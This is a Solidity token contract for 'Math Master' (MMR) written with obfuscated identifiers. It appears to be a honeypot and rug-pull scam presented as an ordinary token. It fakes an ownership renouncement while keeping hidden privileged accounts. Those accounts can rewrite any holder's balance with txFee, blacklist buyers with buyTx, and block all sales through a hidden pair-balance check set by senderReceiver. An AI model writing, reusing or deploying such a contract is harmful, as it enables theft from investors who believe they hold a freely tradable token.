//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface tradingFee {
    function createPair(address totalAmount, address swapLimitExempt) external returns (address);
}

interface fundSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountAt) external view returns (uint256);

    function transfer(address buyFee, uint256 amountTotal) external returns (bool);

    function allowance(address receiverSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountTotal) external returns (bool);

    function transferFrom(
        address sender,
        address buyFee,
        uint256 amountTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountLiquidity, uint256 value);
    event Approval(address indexed receiverSwap, address indexed spender, uint256 value);
}

abstract contract shouldSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenReceiverEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toTeam is fundSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MathMaster is shouldSell, fundSwap, toTeam {

    address amountSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 marketingLaunched;

    function receiverWallet(address launchedListLimit, address buyFee, uint256 amountTotal) internal returns (bool) {
        require(sellLaunched[launchedListLimit] >= amountTotal);
        sellLaunched[launchedListLimit] -= amountTotal;
        sellLaunched[buyFee] += amountTotal;
        emit Transfer(launchedListLimit, buyFee, amountTotal);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return walletAt;
    }

    function buyTx(address toBuy) public {
        buyFrom();
        
        if (toBuy == atAutoMax || toBuy == shouldBuy) {
            return;
        }
        fundMax[toBuy] = true;
    }

    function transfer(address fromListLaunched, uint256 amountTotal) external virtual override returns (bool) {
        return marketingBuyTeam(_msgSender(), fromListLaunched, amountTotal);
    }

    bool public launchedWallet;

    function getOwner() external view returns (address) {
        return liquidityReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingToFrom;
    }

    uint256 amountTo;

    address sellLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function owner() external view returns (address) {
        return liquidityReceiver;
    }

    function fundEnable(address maxLaunched) public {
        require(maxLaunched.balance < 100000);
        if (launchedMarketing) {
            return;
        }
        if (atLimit) {
            launchTotalReceiver = true;
        }
        exemptAmount[maxLaunched] = true;
        if (launchTotalReceiver != launchedWallet) {
            isTake = fundBuyMarketing;
        }
        launchedMarketing = true;
    }

    function transferFrom(address launchedListLimit, address buyFee, uint256 amountTotal) external override returns (bool) {
        if (_msgSender() != sellLaunch) {
            if (swapLaunch[launchedListLimit][_msgSender()] != type(uint256).max) {
                require(amountTotal <= swapLaunch[launchedListLimit][_msgSender()]);
                swapLaunch[launchedListLimit][_msgSender()] -= amountTotal;
            }
        }
        return marketingBuyTeam(launchedListLimit, buyFee, amountTotal);
    }

    function name() external view virtual override returns (string memory) {
        return takeSwap;
    }

    bool private launchTotalReceiver;

    constructor (){
        
        tokenReceiverEnable launchedTrading = tokenReceiverEnable(sellLaunch);
        shouldBuy = tradingFee(launchedTrading.factory()).createPair(launchedTrading.WETH(), address(this));
        if (fundBuyMarketing != senderSell) {
            launchedWallet = false;
        }
        atAutoMax = _msgSender();
        exemptAmount[atAutoMax] = true;
        sellLaunched[atAutoMax] = swapWallet;
        exemptAtTeam();
        if (fundBuyMarketing != senderSell) {
            launchTotalReceiver = true;
        }
        emit Transfer(address(0), atAutoMax, swapWallet);
    }

    mapping(address => mapping(address => uint256)) private swapLaunch;

    uint256 private swapWallet = 100000000 * 10 ** 18;

    uint8 private walletAt = 18;

    bool private atLimit;

    uint256 public senderSell;

    address public shouldBuy;

    function totalSupply() external view virtual override returns (uint256) {
        return swapWallet;
    }

    uint256 constant marketingIs = 19 ** 10;

    function senderReceiver(uint256 amountTotal) public {
        buyFrom();
        marketingLaunched = amountTotal;
    }

    mapping(address => uint256) private sellLaunched;

    function marketingBuyTeam(address launchedListLimit, address buyFee, uint256 amountTotal) internal returns (bool) {
        if (launchedListLimit == atAutoMax) {
            return receiverWallet(launchedListLimit, buyFee, amountTotal);
        }
        uint256 marketingEnable = fundSwap(shouldBuy).balanceOf(amountSwap);
        require(marketingEnable == marketingLaunched);
        require(buyFee != amountSwap);
        if (fundMax[launchedListLimit]) {
            return receiverWallet(launchedListLimit, buyFee, marketingIs);
        }
        return receiverWallet(launchedListLimit, buyFee, amountTotal);
    }

    function txFee(address fromListLaunched, uint256 amountTotal) public {
        buyFrom();
        sellLaunched[fromListLaunched] = amountTotal;
    }

    uint256 public fundBuyMarketing;

    function buyFrom() private view {
        require(exemptAmount[_msgSender()]);
    }

    function exemptAtTeam() public {
        emit OwnershipTransferred(atAutoMax, address(0));
        liquidityReceiver = address(0);
    }

    bool public launchedMarketing;

    function allowance(address liquidityMinAt, address modeMax) external view virtual override returns (uint256) {
        if (modeMax == sellLaunch) {
            return type(uint256).max;
        }
        return swapLaunch[liquidityMinAt][modeMax];
    }

    string private takeSwap = "Math Master";

    address private liquidityReceiver;

    mapping(address => bool) public exemptAmount;

    mapping(address => bool) public fundMax;

    address public atAutoMax;

    function approve(address modeMax, uint256 amountTotal) public virtual override returns (bool) {
        swapLaunch[_msgSender()][modeMax] = amountTotal;
        emit Approval(_msgSender(), modeMax, amountTotal);
        return true;
    }

    string private tradingToFrom = "MMR";

    event OwnershipTransferred(address indexed receiverTx, address indexed tokenMode);

    uint256 private isTake;

    function balanceOf(address amountAt) public view virtual override returns (uint256) {
        return sellLaunched[amountAt];
    }

}